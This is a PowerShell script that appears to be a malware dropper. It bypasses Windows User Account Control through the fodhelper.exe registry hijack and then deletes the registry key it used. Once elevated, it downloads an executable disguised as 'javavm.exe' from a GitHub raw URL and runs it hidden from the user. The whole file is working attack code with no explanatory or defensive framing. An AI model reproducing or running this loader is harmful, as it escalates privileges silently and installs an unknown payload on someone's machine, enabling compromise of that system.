if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $program = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Normal -File `"$PSCommandPath`""
    $registryPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"

    if (!(Test-Path $registryPath)) { New-Item $registryPath -Force | Out-Null }

    New-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path $registryPath -Name "(default)" -Value $program -Force | Out-Null

    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Start-Sleep 1.5
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force

    exit
}

$url = "https://raw.githubusercontent.com/krutoyratir/javaw/refs/heads/main/javavm.exe"
$file = "$env:TEMP\$([guid]::NewGuid()).exe"

Invoke-WebRequest -Uri $url -OutFile $file -UseBasicParsing -ErrorAction Stop;
Start-Process -FilePath $file -WindowStyle Hidden -Wait;